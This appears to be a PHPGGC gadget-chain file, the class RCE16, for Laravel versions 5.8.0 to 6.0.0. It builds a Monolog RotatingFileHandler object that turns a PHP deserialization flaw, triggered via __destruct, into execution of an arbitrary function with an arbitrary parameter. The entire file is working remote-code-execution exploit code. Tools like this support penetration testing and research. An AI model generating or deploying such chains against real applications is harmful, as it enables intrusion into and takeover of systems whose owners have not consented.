<?php

namespace GadgetChain\Laravel;

class RCE16 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '5.8.0 <= 6.0.0';
    public static $vector = '__destruct';
    public static $author = 'CyanM0un';
    public static $information = 'add a entry for rce10';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $param = $parameters['parameter'];
        
        return new \Monolog\Handler\RotatingFileHandler($function,$param);
    }
}
